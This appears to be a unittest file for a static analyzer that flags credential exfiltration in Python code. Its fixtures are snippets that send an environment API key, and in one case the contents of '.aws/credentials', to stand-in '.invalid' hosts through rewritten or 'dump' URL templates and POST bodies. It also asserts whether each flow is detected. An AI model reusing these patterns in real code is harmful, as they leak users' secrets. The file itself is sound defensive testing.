"""Bounded named-literal templates preserve purpose, never suppress raw flows."""
import unittest
from test_qindun_certify import MODULE


class PythonNamedTemplateAuthTests(unittest.TestCase):
    def test_named_template_contracts(self):
        cases = [
            ("named_direct", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nrequests.get(template.format(key))", ["candidate"], False),
            ("named_bound", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nurl=template.format(key)\nrequests.get(url)", ["candidate"], False),
            ("named_keyword", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?token={secret}\"\nrequests.get(template.format(secret=key))", ["candidate"], False),
            ("alias_before_overwrite", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nold=template\ntemplate=\"https://service.invalid/?dump={}\"\nrequests.get(old.format(key))", ["candidate"], False),
            ("overwrite_payload", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\ntemplate=\"https://service.invalid/?dump={}\"\nrequests.get(template.format(key))", ["confirmed"], False),
            ("overwrite_unknown", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\ntemplate=os.getenv(\"URL_TEMPLATE\")\nrequests.get(template.format(key))", ["confirmed"], False),
            ("body_raw", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nurl=template.format(key)\nrequests.post(\"https://other.invalid\",data=url)", ["confirmed"], False),
            ("logging_raw", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nurl=template.format(key)\nrequests.get(url)\nprint(url)", ["candidate"], True),
            ("mixed_raw", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nrequests.get(template.format(key))\nrequests.post(\"https://other.invalid\",data=key)", ["candidate","confirmed"], False),
            ("branch_same", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\nif choose:\n    template=\"https://service.invalid/api?key={}\"\nelse:\n    template=\"https://service.invalid/api?key={}\"\nrequests.get(template.format(key))", ["candidate"], False),
            ("branch_different", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nif choose:\n    template=\"https://other.invalid/?dump={}\"\nrequests.get(template.format(key))", ["confirmed"], False),
            ("global_at_call", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\ndef fetch(value):\n    return requests.get(template.format(value))\nfetch(key)", ["candidate"], False),
            ("global_rebind", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\ndef fetch(value):\n    return requests.get(template.format(value))\ntemplate=\"https://service.invalid/?dump={}\"\nfetch(key)", ["confirmed"], False),
            ("default_capture", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\ndef fetch(value,pattern=template):\n    return requests.get(pattern.format(value))\ntemplate=\"https://service.invalid/?dump={}\"\nfetch(key)", ["candidate"], False),
            ("default_override", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\ndef fetch(value,pattern=template):\n    return requests.get(pattern.format(value))\nfetch(key,\"https://service.invalid/?dump={}\")", ["confirmed"], False),
            ("argument_template", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\ndef fetch(pattern,value):\n    requests.get(pattern.format(value))\nfetch(template,key)", ["candidate"], False),
            ("helper_build", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\ndef build(value):\n    return template.format(value)\nrequests.get(build(key))", ["candidate"], False),
            ("cached_rebind", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\ndef fetch(value):\n    requests.get(template.format(value))\nfetch(key)\ntemplate=\"https://service.invalid/?dump={}\"\nfetch(key)", ["candidate","confirmed"], False),
            ("dynamic_authority", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://{host}/api?key={secret}\"\nrequests.get(template.format(host=host,secret=key))", ["confirmed"], False),
            ("dynamic_path", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/{model}?key={secret}\"\nrequests.get(template.format(model=model,secret=key))", ["confirmed"], False),
            ("mapping_value", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nkey={\"value\":key}\nrequests.get(template.format(key))", ["confirmed"], False),
            ("credential_file", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nkey=open(\".aws/credentials\").read()\nrequests.get(template.format(key))", ["confirmed"], False),
            ("sequence_value", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nkey=[key]\nrequests.get(template.format(key))", ["confirmed"], False),
            ("request_metadata", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nreq=urllib.request.Request(template.format(key))\nresponse=urllib.request.urlopen(req)\nprint(response.url)", ["candidate"], True),
            ("concat_payload", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\ntemplate+=\"&dump={}\"\nrequests.get(template.format(key,key))", ["confirmed"], False),
            ("unknown_transform", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\ntemplate=transform(template)\nrequests.get(template.format(key))", ["confirmed"], False),
            ("format_conversion", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/?key={!r}\"\nrequests.get(template.format(key))", ["confirmed"], False),
            ("unused_argument", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nrequests.get(template.format(key,key))", ["confirmed"], False),
            ("public_value", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/api?key={}\"\nkey=\"public\"\nrequests.get(template.format(key))", [], False),
            ("branch_missing", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\nif choose:\n    template=\"https://service.invalid/?key={}\"\nrequests.get(template.format(key))", ["confirmed"], False),
            ("branch_distinct_auth", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\nif choose:\n    template=\"https://service.invalid/?key={}\"\nelse:\n    template=\"https://other.invalid/?token={}\"\nrequests.get(template.format(key))", ["confirmed"], False),
            ("template_factory", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ndef pattern():\n    return \"https://service.invalid/?key={}\"\ntemplate=pattern()\nrequests.get(template.format(key))", ["candidate"], False),
            ("template_argument_rebind", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ndef fetch(pattern,value):\n    pattern=\"https://service.invalid/?dump={}\"\n    requests.get(pattern.format(value))\nfetch(\"https://service.invalid/?key={}\",key)", ["confirmed"], False),
            ("template_argument_cache", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ndef fetch(pattern,value):\n    requests.get(pattern.format(value))\nfetch(\"https://service.invalid/?key={}\",key)\nfetch(\"https://service.invalid/?dump={}\",key)", ["candidate","confirmed"], False),
            ("retained_constructed_value", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/?key={}\"\nurl=template.format(key)\ntemplate=\"https://service.invalid/?dump={}\"\nkey=\"public\"\nrequests.get(url)", ["candidate"], False),
            ("dynamic_name_shadows_literal", "import os, requests, urllib.request\nkey=os.getenv(\"API_KEY\")\ntemplate=\"https://service.invalid/?key={}\"\ndef fetch(template,value):\n    requests.get(template.format(value))\nfetch(os.getenv(\"URL_TEMPLATE\"),key)", ["confirmed"], False),
            ("template_size_bound", 'import os,requests\nkey=os.getenv("API_KEY")\ntemplate="https://service.invalid/' + "x" * 8192 + '?key={}"\nrequests.get(template.format(key))', ["confirmed"], False),
        ]
        for name, source, expected, output in cases:
            with self.subTest(name=name):
                # The local report upgrades the shared sink; platform also keeps call sites.
                if name == "template_argument_cache":
                    expected = ["confirmed"]
                hits, error = MODULE._python_flow_findings("main.py", source)
                self.assertIsNone(error)
                self.assertEqual(
                    sorted({h.disposition for h in hits
                            if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"}), expected
                )
                self.assertEqual(
                    any(h.rule_id == "QINDUN.D5.CREDENTIAL_OUTPUT" for h in hits), output
                )
